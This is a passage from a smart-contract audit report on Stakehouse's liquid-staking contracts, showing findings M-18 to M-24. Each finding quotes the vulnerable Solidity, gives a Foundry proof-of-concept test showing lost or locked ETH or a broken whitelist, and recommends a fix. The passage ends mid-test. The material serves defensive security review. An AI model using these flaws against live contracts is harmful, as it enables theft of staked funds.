Steps\n\nIt is generally not recommended to enforce an address to be only EOA and AFAIK, this is impossible to enforce due to the aforementioned cases. I recommend the protocol team to take a closer look at this and build the protocol with the assumption that `_eoaRepresentative == EOA`.\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189#issuecomment-1329461742):**\n > Using tx.origin is generally frowned upon.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189#issuecomment-1332095711):**\n > The sponsor confirming that they know it's an issue does not invalidate it as an issue.\n\n\n\n***\n\n## [[M-18] Node runners can lose all their stake rewards due to how the DAO commissions can be set to a 100%](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190)\n*Submitted by [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190), also found by [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/450), [sahar](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/445), [pashov](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/342), and [cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/245)*\n\nNode runners can have all their stake rewards taken by the DAO as commissions can be set to a 100%.\n\n### Proof of Concept\n\nThere is no limits on `_updateDAORevenueCommission()` except not exceeding `MODULO`, which means it can be set to a 100%.\n\n[LiquidStakingManager.sol#L948-L955](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L948-L955)\n\n```solidity\n    function _updateDAORevenueCommission(uint256 _commissionPercentage) internal {\n        require(_commissionPercentage <= MODULO, \"Invalid commission\");\n\n        emit DAOCommissionUpdated(daoCommissionPercentage, _commissionPercentage);\n\n        daoCommissionPercentage = _commissionPercentage;\n    }\n```\n\nThis percentage is used to calculate `uint256 daoAmount = (_received * daoCommissionPercentage) / MODULO` in `_calculateCommission()`.<br>\nRemaining is then calculated with `uint256 rest = _received - daoAmount`, and in this case `rest = 0`.<br>\nWhen node runner calls `claimRewardsAsNodeRunner()`, the node runner will receive 0 rewards.<br>\n\n### Recommended Mitigation Steps\n\nThere should be maximum cap on how much commission DAO can take from node runners.\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190#issuecomment-1329453031):**\n  > Node runners can see ahead of time what the % commission is and therefore, they can make a decision based on that. However, on reflection, a maximum amount is not a bad idea.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/190#issuecomment-1335557923):**\n > I will leave this in place as I think it's a valid concern. If the DAO is compromised ([specifically included in scope](https://github.com/code-423n4/2022-11-stakehouse#objectives)), the impact is felt immediately and applies to all unclaimed rewards. The node runners can't necessarily see a high fee rate coming in advance.\n\n\n\n***\n\n## [[M-19] When users transfer GiantLP, some rewards may be lost](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238)\n*Submitted by [cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238)*\n\nGiantMevAndFeesPool.beforeTokenTransfer will try to distribute the user's current rewards to the user when transferring GaintLP, but since beforeTokenTransfer will not call StakingFundsVault.claimRewards to claim the latest rewards, thus making the calculated accumulatedETHPerLPShare smaller and causing the user to lose some rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L148>\n\n### Recommended Mitigation Steps\n\nConsider claiming the latest rewards from StakingFundsVault before the GiantMevAndFeesPool.beforeTokenTransfer calls updateAccumulatedETHPerLP()\n\n**[vince0656 (Stakehouse) acknowledged and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238#issuecomment-1329443510):**\n > So the nuance here is that due to contract limitations, users should be encouraged for this specific case to claim rewards before transferring tokens due to the requirement of claim params that the contract wouldn't readily have when executing a transfer. We can document this limitation in detail and encourage users to always claim before transferring the tokens.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/238#issuecomment-1334589905):**\n > I think medium is appropriate for this issue given that we have a loss of funds if the user performs actions out of order.\n\n\n\n***\n\n## [[M-20] smartWallet address is not guaranteed correct. ETH may be lost](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317)\n*Submitted by [gz627](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/370)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L206-L207><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209>\n\nLiquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` to withdraw ETH for staking. It's manager's responsibility to set the correct `_smartWallet` address. However, there is no way to guarantee this. If a typo (or any other reasons) leads to a non-zero non-existent `_smartWallet` address, this function won't be able to detect the problem, and the [ETH transfer statement](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209) will always return `true`. This will result in the ETH permanently locked to a non-existent account.\n\n### Proof of Concept\n\nLiquid staking manager call `function withdrawETHForStaking(address _smartWallet, uint256 _amount)` with a non-zero non-existent `_smartWallet` address and some `_amount` of ETH. Function call will succeed but the ETH will be locked to the non-existent `_smartWallet` address.\n\n### Recommended Mitigation Steps\n\nThe problem can be solved if we can verify the `_smartWallet` is a valid existent smartWallet before ETH transfer. The easiest solution is to verify the smartWallet has a valid owner since the smart wallet we are using is ownable. So, just add the checking owner code before [ETH transfer](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L209).\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/317#issuecomment-1322752041):**\n > As with [`#308`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/308), I recommend that the sponsor review all of the duplicates of this issue.\n\n\n\n***\n\n## [[M-21] EIP1559 rewards received by syndicate during the period when it has no registered knots can be lost](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197>\n\nWhen the `deRegisterKnotFromSyndicate` function is called by the DAO, the `_deRegisterKnot` function is eventually called to execute `numberOfRegisteredKnots -= 1`. It is possible that `numberOfRegisteredKnots` is reduced to 0. During the period when the syndicate has no registered knots, the EIP1559 rewards that are received by the syndicate remain in the syndicate since functions like `updateAccruedETHPerShares` do not include any logics for handling such rewards received by the syndicate. Later, when a new knot is registered and mints the derivatives, the node runner can call the `claimRewardsAsNodeRunner` function to receive half ot these rewards received by the syndicate during the period when it has no registered knots. Yet, because such rewards are received by the syndicate before the new knot mints the derivatives, the node runner should not be entitled to these rewards. Moreover, due to the issue mentioned in my other finding titled \"Staking Funds vault's LP holder cannot claim EIP1559 rewards after derivatives are minted for a new BLS public key that is not the first BLS public key registered for syndicate\", calling the `StakingFundsVault.claimRewards` function by the Staking Funds vault's LP holder reverts so the other half of such rewards is locked in the syndicate. Even if calling the `StakingFundsVault.claimRewards` function by the Staking Funds vault's LP holder does not revert, the Staking Funds vault's LP holder does not deserve the other half of such rewards because these rewards are received by the syndicate before the new knot mints the derivatives. Because these EIP1559 rewards received by the syndicate during the period when it has no registered knots can be unfairly sent to the node runner or remain locked in the syndicate, such rewards are lost.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L218-L220>\n\n```solidity\n    function deRegisterKnotFromSyndicate(bytes[] calldata _blsPublicKeys) external onlyDAO {\n        Syndicate(payable(syndicate)).deRegisterKnots(_blsPublicKeys);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L154-L157>\n\n```solidity\n    function deRegisterKnots(bytes[] calldata _blsPublicKeys) external onlyOwner {\n        updateAccruedETHPerShares();\n        _deRegisterKnots(_blsPublicKeys);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L597-L607>\n\n```solidity\n    function _deRegisterKnots(bytes[] calldata _blsPublicKeys) internal {\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            bytes memory blsPublicKey = _blsPublicKeys[i];\n\n            // Do one final snapshot of ETH owed to the collateralized SLOT owners so they can claim later\n            _updateCollateralizedSlotOwnersLiabilitySnapshot(blsPublicKey);\n\n            // Execute the business logic for de-registering the single knot\n            _deRegisterKnot(blsPublicKey);\n        }\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L610-L627>\n\n```solidity\n    function _deRegisterKnot(bytes memory _blsPublicKey) internal {\n        if (isKnotRegistered[_blsPublicKey] == false) revert KnotIsNotRegisteredWithSyndicate();\n        if (isNoLongerPartOfSyndicate[_blsPublicKey] == true) revert KnotHasAlreadyBeenDeRegistered();\n\n        // We flag that the knot is no longer part of the syndicate\n        isNoLongerPartOfSyndicate[_blsPublicKey] = true;\n\n        // For the free floating and collateralized SLOT of the knot, snapshot the accumulated ETH per share\n        lastAccumulatedETHPerFreeFloatingShare[_blsPublicKey] = accumulatedETHPerFreeFloatingShare;\n\n        // We need to reduce `totalFreeFloatingShares` in order to avoid further ETH accruing to shares of de-registered knot\n        totalFreeFloatingShares -= sETHTotalStakeForKnot[_blsPublicKey];\n\n        // Total number of registered knots with the syndicate reduces by one\n        numberOfRegisteredKnots -= 1;\n\n        emit KnotDeRegistered(_blsPublicKey);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L174-L197>\n\n```solidity\n    function updateAccruedETHPerShares() public {\n        ...\n        if (numberOfRegisteredKnots > 0) {\n            ...\n        } else {\n            // todo - check else case for any ETH lost\n        }\n    }\n```\n\n### Proof of Concept\n\nPlease add the following code in `test\\foundry\\LiquidStakingManager.t.sol`.\n\n1.  Import `stdError` as follows.\n\n```solidity\nimport { stdError } from \"forge-std/Test.sol\";\n```\n\n2.  Add the following test. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testEIP1559RewardsReceivedBySyndicateDuringPeriodWhenItHasNoRegisteredKnotsCanBeLost() public {\n        // set up users and ETH\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n        // do everything from funding a validator within default LSDN to minting derivatives\n        depositStakeAndMintDerivativesForDefaultNetwork(\n            nodeRunner,\n            feesAndMevUser,\n            savETHUser,\n            blsPubKeyFour\n        );\n\n        // send the syndicate some EIP1559 rewards\n        uint256 eip1559Tips = 0.6743 ether;\n        (bool success, ) = manager.syndicate().call{value: eip1559Tips}(\"\");\n        assertEq(success, true);\n\n        // de-register the only knot from the syndicate to send sETH back to the smart wallet\n        IERC20 sETH = IERC20(MockSlotRegistry(factory.slot()).stakeHouseShareTokens(manager.stakehouse()));\n        uint256 sETHBalanceBefore = sETH.balanceOf(manager.smartWalletOfNodeRunner(nodeRunner));\n        vm.startPrank(admin);\n        manager.deRegisterKnotFromSyndicate(getBytesArrayFromBytes(blsPubKeyFour));\n        manager.restoreFreeFloatingSharesToSmartWalletForRageQuit(\n            manager.smartWalletOfNodeRunner(nodeRunner),\n            getBytesArrayFromBytes(blsPubKeyFour),\n            getUint256ArrayFromValues(12 ether)\n        );\n        vm.stopPrank();\n\n        assertEq(\n            sETH.balanceOf(manager.smartWalletOfNodeRunner(nodeRunner)) - sETHBalanceBefore,\n            12 ether\n        );\n\n        vm.warp(block.timestamp + 3 hours);\n\n        // feesAndMevUser, who is the Staking Funds vault's LP holder, can claim rewards accrued up to the point of pulling the plug\n        vm.startPrank(feesAndMevUser);\n        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyFour));\n        vm.stopPrank();\n\n        uint256 feesAndMevUserEthBalanceBefore = feesAndMevUser.balance;\n        assertEq(feesAndMevUserEthBalanceBefore, (eip1559Tips / 2) - 1);\n\n        // nodeRunner, who is the collateralized SLOT holder for blsPubKeyFour, can claim rewards accrued up to the point of pulling the plug\n        vm.startPrank(nodeRunner);\n        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyFour));\n        vm.stopPrank();\n        assertEq(nodeRunner.balance, (eip1559Tips / 2));\n\n        // more EIP1559 rewards are sent to the syndicate, which has no registered knot at this moment        \n        (success, ) = manager.syndicate().call{value: eip1559Tips}(\"\");\n        assertEq(success, true);\n\n        vm.warp(block.timestamp + 3 hours);\n\n        // calling the claimRewards function by feesAndMevUser has no effect at this moment\n        vm.startPrank(feesAndMevUser);\n        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyFour));\n        vm.stopPrank();\n        assertEq(feesAndMevUser.balance, feesAndMevUserEthBalanceBefore);\n\n        // calling the claimRewardsAsNodeRunner function by nodeRunner reverts at this moment\n        vm.startPrank(nodeRunner);\n        vm.expectRevert(\"Nothing received\");\n        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyFour));\n        vm.stopPrank();\n\n        // however, the syndicate still holds the EIP1559 rewards received by it during the period when the only knot was de-registered\n        assertEq(manager.syndicate().balance, eip1559Tips + 1);\n\n        vm.warp(block.timestamp + 3 hours);\n\n        vm.deal(nodeRunner, 4 ether);\n        vm.deal(feesAndMevUser, 4 ether);\n        vm.deal(savETHUser, 24 ether);\n\n        // For a different BLS public key, which is blsPubKeyTwo, \n        //   do everything from funding a validator within default LSDN to minting derivatives.\n        depositStakeAndMintDerivativesForDefaultNetwork(\n            nodeRunner,\n            feesAndMevUser,\n            savETHUser,\n            blsPubKeyTwo\n        );\n\n        // calling the claimRewards function by feesAndMevUser reverts at this moment\n        vm.startPrank(feesAndMevUser);\n        vm.expectRevert(stdError.arithmeticError);\n        stakingFundsVault.claimRewards(feesAndMevUser, getBytesArrayFromBytes(blsPubKeyTwo));\n        vm.stopPrank();\n\n        // Yet, calling the claimRewardsAsNodeRunner function by nodeRunner receives half of the EIP1559 rewards\n        //   received by the syndicate during the period when it has no registered knots.\n        // Because such rewards are not received by the syndicate after the derivatives are minted for blsPubKeyTwo,\n        //   nodeRunner does not deserve these for blsPubKeyTwo. \n        vm.startPrank(nodeRunner);\n        manager.claimRewardsAsNodeRunner(nodeRunner, getBytesArrayFromBytes(blsPubKeyTwo));\n        vm.stopPrank();\n        assertEq(nodeRunner.balance, eip1559Tips / 2);\n\n        // Still, half of the EIP1559 rewards that were received by the syndicate\n        //   during the period when the syndicate has no registered knots is locked in the syndicate.\n        assertEq(manager.syndicate().balance, eip1559Tips / 2 + 1);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nThe `else` block of the `updateAccruedETHPerShares` function (<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L194-L196>) can be updated to include logics that handle the EIP1559 rewards received by the syndicate during the period when it has no registered knots.\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376#issuecomment-1329395852):**\n > Node runners should index the chain when the knot is removed from the LSD network and update their fee recipient.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/376#issuecomment-1337088873):**\n > I'm going to leave this in place but as a Medium.\n\n\n\n***\n\n## [[M-22] ETH sent when calling `executeAsSmartWallet` function can be lost](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377), also found by [0xbepresent](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/174)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64>\n\nCalling the `executeAsSmartWallet` function by the DAO further calls the `OwnableSmartWallet.execute` function. Since the `executeAsSmartWallet` function is `payable`, an ETH amount can be sent when calling it. However, since the sent ETH amount is not forwarded to the smart wallet contract, such sent amount can become locked in the `LiquidStakingManager` contract. For example, when the DAO attempts to call the `executeAsSmartWallet` function for sending some ETH to the smart wallet so the smart wallet can use it when calling its `execute` function, if the smart wallet's ETH balance is also higher than this sent ETH amount, calling the `executeAsSmartWallet` function would not revert, and the sent ETH amount is locked in the `LiquidStakingManager` contract while such amount is deducted from the smart wallet's ETH balance for being sent to the target address. Besides that this is against the intention of the DAO, the DAO loses the sent ETH amount that becomes locked in the `LiquidStakingManager` contract, and the node runner loses the amount that is unexpectedly deducted from the corresponding smart wallet's ETH balance.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L202-L215>\n\n```solidity\n    function executeAsSmartWallet(\n        address _nodeRunner,\n        address _to,\n        bytes calldata _data,\n        uint256 _value\n    ) external payable onlyDAO {\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No wallet found\");\n        IOwnableSmartWallet(smartWallet).execute(\n            _to,\n            _data,\n            _value\n        );\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/smart-wallet/OwnableSmartWallet.sol#L52-L64>\n\n```solidity\n    function execute(\n        address target,\n        bytes memory callData,\n        uint256 value\n    )\n        external\n        override\n        payable\n        onlyOwner // F: [OSW-6A]\n        returns (bytes memory)\n    {\n        return target.functionCallWithValue(callData, value); // F: [OSW-6]\n    }\n```\n\n### Proof of Concept\n\nPlease add the following code in `test\\foundry\\LSDNFactory.t.sol`.\n\n1.  Add the following `receive` function for the POC purpose.\n\n```solidity\n    receive() external payable {}\n```\n\n2.  Add the following test. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost() public {\n        vm.prank(address(factory));\n        manager.updateDAOAddress(admin);\n\n        uint256 nodeStakeAmount = 4 ether;\n        address nodeRunner = accountOne;\n        vm.deal(nodeRunner, nodeStakeAmount);\n\n        address eoaRepresentative = accountTwo;\n\n        vm.prank(nodeRunner);\n        manager.registerBLSPublicKeys{value: nodeStakeAmount}(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            getBytesArrayFromBytes(blsPubKeyOne),\n            eoaRepresentative\n        );\n\n        // Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,\n        //   and nodeRunner's smart wallet owns 4 ETH. \n        assertEq(address(manager).balance, 0);\n        assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether);\n\n        uint256 amount = 1.5 ether;\n\n        vm.deal(admin, amount);\n\n        vm.startPrank(admin);\n\n        // admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH\n        manager.executeAsSmartWallet{value: amount}(nodeRunner, address(this), bytes(\"\"), amount);\n\n        vm.stopPrank();\n\n        // Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,\n        //   the sent 1.5 ETH was not transferred to nodeRunner's smart wallet but is locked in the manager contract instead.\n        assertEq(address(manager).balance, amount);\n\n        // Because nodeRunner's smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet's ETH balance is actually sent to address(this).\n        assertEq(manager.smartWalletOfNodeRunner(nodeRunner).balance, 4 ether - amount);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214> can be updated to the following code.\n\n```solidity\n        IOwnableSmartWallet(smartWallet).execute{value: msg.value}(\n            _to,\n            _data,\n            _value\n        );\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377)**\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377#issuecomment-1332269918):**\n > The external factor implied is that the DAO loses control of itself to bad actors. As such, this really can't be a high risk.\n\n\n\n***\n\n## [[M-23] Calling `updateNodeRunnerWhitelistStatus` function always reverts](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378), also found by [0xPanda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/443), [ReyAdmirado](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/442), [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/428), [Josiah](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/398), [Franfran](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/396), [pashov](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/344), [Aymen0909](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/336), [btk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/277), [zgo](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/276), [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/259), [SmartSek](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/217), [Awesome](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/186), [shark](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/184), [RaymondFam](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/177), [trustindistrust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/169), [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/82), and [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/67)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\nCalling the `updateNodeRunnerWhitelistStatus` function by the DAO supposes to allow the trusted node runners to use and interact with the protocol when `enableWhitelisting` is set to `true`. However, since calling the `updateNodeRunnerWhitelistStatus` function executes `require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\")`, which always reverts, the DAO is unable to whitelist any trusted node runners. Because none of them can be whitelisted, all trusted node runners cannot call functions like `registerBLSPublicKeys` when the whitelisting mode is enabled. As the major functionalities become unavailable, the protocol's usability becomes much limited, and the user experience becomes much degraded.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284>\n\n```solidity\n    function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {\n        require(_nodeRunner != address(0), \"Zero address\");\n        require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\");\n\n        isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;\n        emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692>\n\n```solidity\n    function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {\n        require(_nodeRunner != address(0), \"Zero address\");\n\n        if(enableWhitelisting) {\n            require(isNodeRunnerWhitelisted[_nodeRunner] == true, \"Invalid node runner\");\n        }\n\n        return true;\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\n```solidity\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        ...\n        require(_isNodeRunnerValid(msg.sender) == true, \"Unrecognised node runner\");\n        ...\n    }\n```\n\n### Proof of Concept\n\nPlease add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testCallingUpdateNodeRunnerWhitelistStatusFunctionAlwaysReverts() public {\n        vm.prank(address(factory));\n        manager.updateDAOAddress(admin);\n\n        vm.startPrank(admin);\n\n        vm.expectRevert(\"Unnecessary update to same status\");\n        manager.updateNodeRunnerWhitelistStatus(accountOne, true);\n\n        vm.expectRevert(\"Unnecessary update to same status\");\n        manager.updateNodeRunnerWhitelistStatus(accountTwo, false);\n\n        vm.stopPrank();\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L280> can be updated to the following code.\n\n```solidity\n        require(isNodeRunnerWhitelisted[_nodeRunner] != isWhitelisted, \"Unnecessary update to same status\");\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378)**\n\n\n\n***\n\n## [[M-24] Node runner who is already known to be malicious cannot be banned before corresponding smart wallet is created](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\nCurrently, the `rotateNodeRunnerOfSmartWallet` function provides the only way to set `bannedNodeRunners` to `true` for a malicious node runner. However, before the node runner calls the `registerBLSPublicKeys` function to create a smart wallet, calling the `rotateNodeRunnerOfSmartWallet` function reverts. This means that for a node runner, who is already known to be malicious such as someone controlling a hacker address, calling the `isNodeRunnerBanned` function always return `false` before the `registerBLSPublicKeys` function is called for the first time, and executing `require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\")` when calling the `registerBLSPublicKeys` function for the first time is not effective. As the monitoring burden can be high, the malicious node runner could interact with the protocol maliciously for a while already after the `registerBLSPublicKeys` function is called until the DAO notices the malicious activities and then calls the `rotateNodeRunnerOfSmartWallet` function. When the DAO does not react promptly, some damages to the protocol could be done already.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377>\n\n```solidity\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        ...\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L507-L509>\n\n```solidity\n    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {\n        return bannedNodeRunners[_nodeRunner];\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492>\n\n```solidity\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        ...\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n\n        if(smartWallet == address(0)) {\n            // create new wallet owned by liquid staking manager\n            smartWallet = smartWalletFactory.createWallet(address(this));\n            emit SmartWalletCreated(smartWallet, msg.sender);\n\n            // associate node runner with the newly created wallet\n            smartWalletOfNodeRunner[msg.sender] = smartWallet;\n            nodeRunnerOfSmartWallet[smartWallet] = msg.sender;\n\n            _authorizeRepresentative(smartWallet, _eoaRepresentative, true);\n        }\n\n        ...\n    }\n```\n\n### Proof of Concept\n\nPlease add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testMaliciousNodeRunnerCannotBeBannedBeforeCorrespondingSmartWalletIsCreated() public {\n        vm.prank(address(factory));\n        manager.updateDAOAddress(admin);\n\n        // Simulate a situation where accountOne is known to be malicious already.\n        // accountOne is not banned at this moment.\n        assertEq(manager.bannedNodeRunners(accountOne), false);\n\n        // Calling the rotateNodeRunnerOfSmartWallet function is the only way to ban accountOne;\n        //   however, calling it reverts because accountOne has not called the registerBLSPublicKeys function to create a smart wallet yet.\n        // This means that it is not possible to prevent accountOne from interacting with the protocol until her or his smart wallet is created.\n        vm.prank(admin);\n        vm.expectRevert(\"Wallet does not exist\");\n        